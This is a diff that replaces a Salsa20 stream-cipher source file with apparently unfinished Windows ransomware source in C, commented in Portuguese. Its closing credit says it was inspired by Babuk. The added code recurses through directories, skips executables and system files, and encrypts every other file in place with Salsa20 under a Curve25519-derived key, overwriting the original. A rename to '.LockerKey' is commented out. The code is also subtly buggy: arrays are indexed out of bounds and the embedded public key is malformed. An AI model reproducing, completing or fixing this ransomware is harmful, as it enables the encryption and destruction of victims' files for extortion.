@@ -1,126 +1,204 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+#include <dirent.h>
+#include "curve25519-donna.h"
+#include <bcrypt.h>
+#include <ntsecapi.h>
+#include "sha512.h"
+#include <locale.h>
 #include "ecrypt-sync.h"
+#include <bcrypt.h>
 
-#define ROTATE(v,c) (ROTL32(v,c))
-#define XOR(v,w) ((v) ^ (w))
-#define PLUS(v,w) (U32V((v) + (w)))
-#define PLUSONE(v) (PLUS((v),1))
 
-static void salsa20_wordtobyte(u8 output[64],const u32 input[16])
-{
-  u32 x[16];
-  int i;
 
-  for (i = 0;i < 16;++i) x[i] = input[i];
-  for (i = 20;i > 0;i -= 2) {
-    x[ 4] = XOR(x[ 4],ROTATE(PLUS(x[ 0],x[12]), 7));
-    x[ 8] = XOR(x[ 8],ROTATE(PLUS(x[ 4],x[ 0]), 9));
-    x[12] = XOR(x[12],ROTATE(PLUS(x[ 8],x[ 4]),13));
-    x[ 0] = XOR(x[ 0],ROTATE(PLUS(x[12],x[ 8]),18));
-    x[ 9] = XOR(x[ 9],ROTATE(PLUS(x[ 5],x[ 1]), 7));
-    x[13] = XOR(x[13],ROTATE(PLUS(x[ 9],x[ 5]), 9));
-    x[ 1] = XOR(x[ 1],ROTATE(PLUS(x[13],x[ 9]),13));
-    x[ 5] = XOR(x[ 5],ROTATE(PLUS(x[ 1],x[13]),18));
-    x[14] = XOR(x[14],ROTATE(PLUS(x[10],x[ 6]), 7));
-    x[ 2] = XOR(x[ 2],ROTATE(PLUS(x[14],x[10]), 9));
-    x[ 6] = XOR(x[ 6],ROTATE(PLUS(x[ 2],x[14]),13));
-    x[10] = XOR(x[10],ROTATE(PLUS(x[ 6],x[ 2]),18));
-    x[ 3] = XOR(x[ 3],ROTATE(PLUS(x[15],x[11]), 7));
-    x[ 7] = XOR(x[ 7],ROTATE(PLUS(x[ 3],x[15]), 9));
-    x[11] = XOR(x[11],ROTATE(PLUS(x[ 7],x[ 3]),13));
-    x[15] = XOR(x[15],ROTATE(PLUS(x[11],x[ 7]),18));
-    x[ 1] = XOR(x[ 1],ROTATE(PLUS(x[ 0],x[ 3]), 7));
-    x[ 2] = XOR(x[ 2],ROTATE(PLUS(x[ 1],x[ 0]), 9));
-    x[ 3] = XOR(x[ 3],ROTATE(PLUS(x[ 2],x[ 1]),13));
-    x[ 0] = XOR(x[ 0],ROTATE(PLUS(x[ 3],x[ 2]),18));
-    x[ 6] = XOR(x[ 6],ROTATE(PLUS(x[ 5],x[ 4]), 7));
-    x[ 7] = XOR(x[ 7],ROTATE(PLUS(x[ 6],x[ 5]), 9));
-    x[ 4] = XOR(x[ 4],ROTATE(PLUS(x[ 7],x[ 6]),13));
-    x[ 5] = XOR(x[ 5],ROTATE(PLUS(x[ 4],x[ 7]),18));
-    x[11] = XOR(x[11],ROTATE(PLUS(x[10],x[ 9]), 7));
-    x[ 8] = XOR(x[ 8],ROTATE(PLUS(x[11],x[10]), 9));
-    x[ 9] = XOR(x[ 9],ROTATE(PLUS(x[ 8],x[11]),13));
-    x[10] = XOR(x[10],ROTATE(PLUS(x[ 9],x[ 8]),18));
-    x[12] = XOR(x[12],ROTATE(PLUS(x[15],x[14]), 7));
-    x[13] = XOR(x[13],ROTATE(PLUS(x[12],x[15]), 9));
-    x[14] = XOR(x[14],ROTATE(PLUS(x[13],x[12]),13));
-    x[15] = XOR(x[15],ROTATE(PLUS(x[14],x[13]),18));
-  }
-  for (i = 0;i < 16;++i) x[i] = PLUS(x[i],input[i]);
-  for (i = 0;i < 16;++i) U32TO8_LITTLE(output + 4 * i,x[i]);
-}
 
-void ECRYPT_init(void)
-{
-  return;
-}
 
-static const char sigma[16] = "expand 32-byte k";
-static const char tau[16] = "expand 16-byte k";
 
-void ECRYPT_keysetup(ECRYPT_ctx *x,const u8 *k,u32 kbits,u32 ivbits)
-{
-  const char *constants;
 
-  x->input[1] = U8TO32_LITTLE(k + 0);
-  x->input[2] = U8TO32_LITTLE(k + 4);
-  x->input[3] = U8TO32_LITTLE(k + 8);
-  x->input[4] = U8TO32_LITTLE(k + 12);
-  if (kbits == 256) { /* recommended */
-    k += 16;
-    constants = sigma;
-  } else { /* kbits == 128 */
-    constants = tau;
-  }
-  x->input[11] = U8TO32_LITTLE(k + 0);
-  x->input[12] = U8TO32_LITTLE(k + 4);
-  x->input[13] = U8TO32_LITTLE(k + 8);
-  x->input[14] = U8TO32_LITTLE(k + 12);
-  x->input[0] = U8TO32_LITTLE(constants + 0);
-  x->input[5] = U8TO32_LITTLE(constants + 4);
-  x->input[10] = U8TO32_LITTLE(constants + 8);
-  x->input[15] = U8TO32_LITTLE(constants + 12);
-}
 
-void ECRYPT_ivsetup(ECRYPT_ctx *x,const u8 *iv)
-{
-  x->input[6] = U8TO32_LITTLE(iv + 0);
-  x->input[7] = U8TO32_LITTLE(iv + 4);
-  x->input[8] = 0;
-  x->input[9] = 0;
-}
 
-void ECRYPT_encrypt_bytes(ECRYPT_ctx *x,const u8 *m,u8 *c,u32 bytes)
-{
-  u8 output[64];
-  int i;
+//funçao de derivaçao de chave use na criptografia simetrica
+int m_publ[32] = {
+        8,  8,  6,  4,  4,  4,  4,  4,  5,  0,
+        'n',  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00
+};
 
-  if (!bytes) return;
-  for (;;) {
-    salsa20_wordtobyte(output,x->input);
-    x->input[8] = PLUSONE(x->input[8]);
-    if (!x->input[8]) {
-      x->input[9] = PLUSONE(x->input[9]);
-      /* stopping at 2^70 bytes per nonce is user's responsibility */
+
+
+void FwriteKey(char *path){}//iscrece a chave publica
+
+const  char C[ 32 ] = { 9 };//Bse
+ //nao use a mesma  chave para cada amostra e vitima//queremos ter  2^256 chaves possivesi
+void cipherxor(BYTE *buffer,int len,BYTE *key){
+int    j=0;
+
+ for(int i = 0; i <= len; i++){
+
+buffer[i]=buffer[i]^=key[i];
+
     }
-    if (bytes <= 64) {
-      for (i = 0;i < bytes;++i) c[i] = m[i] ^ output[i];
-      return;
-    }
-    for (i = 0;i < 64;++i) c[i] = m[i] ^ output[i];
-    bytes -= 64;
-    c += 64;
-    m += 64;
-  }
+
+//segredo compartilhado
+}//usaremos o segredo co
+BYTE generatPrivateKey(BYTE *key){
+    HCRYPTPROV  hCryptProv;
+ memset (key, 0, 32);
+
+
+ if( RtlGenRandom(key,32)==FALSE){
+    printf("erro");
 }
 
-void ECRYPT_decrypt_bytes(ECRYPT_ctx *x,const u8 *c,u8 *m,u32 bytes)
-{
-  ECRYPT_encrypt_bytes(x,c,m,bytes);
+
+return(key[32]);
+
+
 }
 
-void ECRYPT_keystream_bytes(ECRYPT_ctx *x,u8 *stream,u32 bytes)
-{
-  u32 i;
-  for (i = 0;i < bytes;++i) stream[i] = 0;
-  ECRYPT_encrypt_bytes(x,stream,stream,bytes);
+
+
+VOID Encrypt_File(char *name){
+HCRYPTPROV  hCryptProv;
+BYTE pbDataSecrete[ 32];
+BYTE pbDataPublic[ 32];
+BYTE pbShare[ 32];
+BYTE pbShareDest[ 32];
+generatPrivateKey(pbDataSecrete);
+int i=0;
+for(i=0;i<=32;i++){
+
+    printf("%d",pbDataSecrete[i]);
 }
+pbDataSecrete[0] &= 248;
+                    pbDataSecrete[31] &= 127;
+                    pbDataSecrete[31] |= 64;
+                    curve25519_donna(&pbDataPublic,   &pbDataSecrete[ 32], &C);
+                    curve25519_donna(&pbShare,   &pbDataSecrete[ 32], &m_publ);
+                   //SHA512Hash((uint8_t)&pbShare,32);
+                   memset(&pbDataSecrete,0,32);//zeremos a chave privada
+BYTE k[32];
+BYTE *nonce="100116649696923968170152204148972049320091145701181271883417257213772402812516828";
+sha512(pbShare,32,k);
+  ECRYPT_ctx ctx;
+   ECRYPT_init();       //zfaça o hash
+ECRYPT_keysetup(&ctx, k, 256, 256);
+ ECRYPT_ivsetup(&ctx, nonce);
+
+FILE *fin = fopen(name, "rb");//abrimos o arquivo
+    fseek(fin, 0, SEEK_END);//
+    long len = ftell(fin);
+    rewind(fin);//reposiciona o ponteiro  para o iicio
+    BYTE *buffer =(BYTE*) malloc(len);
+    //aloca
+
+
+
+    fread(buffer, len, 1, fin);//Ler o conteudo do arquivo
+ECRYPT_encrypt_bytes(&ctx,buffer,buffer,len);
+memset((BYTE*)&ctx,0,sizeof (ECRYPT_ctx));
+
+memset(k,0,32);
+memset(pbShare,0,32);
+memset(pbDataSecrete,0,32);
+//   cipherxor(buffer,len,shared_secrete);
+     FILE *fout = fopen(name, "wb");//Substituimos o arquivo e iscrevemos os dados criptogrados
+    fwrite(buffer, len, 1, fout);
+    fclose(fout);
+free(buffer);
+
+    /*CHAR newname[MAX_PATH];
+	strcpy(newname,name);
+	strcat(newname,".LockerKey");
+	MoveFile(name,newname);*////Renomeamos e mudamos a extensao dos nosso arquivos
+
+
+
+
+
+
+
+}
+VOID ListDirFile(char *path){
+char sc[MAX_PATH],buf[MAX_PATH];
+	 WIN32_FIND_DATA in;
+	 HANDLE fd,file;
+	 char *fm = "%s\\%s",*fm1 = "%s\\*.*";
+
+	 if(strlen(path) == 3)
+	 {
+		path[2] = '\0'; /* :-) */
+	 }
+
+	 sprintf(sc,fm1,path);
+     fd = FindFirstFile(sc,&in);
+
+ do
+ {
+
+	 sprintf(buf,fm,path,in.cFileName);
+
+	   /* dot :) */
+	 if(strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0 && (in.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
+	 {
+		 ListDirFile(buf);
+	 }
+
+	   /* File found */
+	 else
+	 {
+
+		 /* is it good to encrypt ? */
+
+		 if(  !strstr(in.cFileName,".LockerKey")  &&  !strstr(in.cFileName,".dll")
+			 && !strstr(in.cFileName,".exe") && !strstr(in.cFileName,".ini") &&
+			     !strstr(in.cFileName,".vxd") && !strstr(in.cFileName,".drv") &&
+				 strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0)
+		 {
+			 Encrypt_File(buf);
+		 }
+	 }
+
+ }while(FindNextFile(fd,&in));
+
+ FindClose(fd);
+}
+
+
+
+
+VOID GetDrives(){
+
+
+
+
+
+}//Vamos Obter as Unidades Logicas e Remotas e depois criptograflas
+
+VOID Recursive_List_dir();
+
+
+
+
+
+
+int main(){
+
+
+  ListDirFile("C:\\Users\\estan\\OneDrive\\Documentos\\Nova pasta (3)");
+
+
+
+//ListDirFile(L"C:\\Users\\estan\\OneDrive\\Documentos\\Nova pasta (3)");
+
+BYTE *nonce="100116649696923968170152204148972049320091145701181271883417257213772402812516828";
+
+
+printf("%d",nonce);
+
+
+
+return 0;}
+//Autor Hackerxploitation  ispirado nobabuuk ransoware
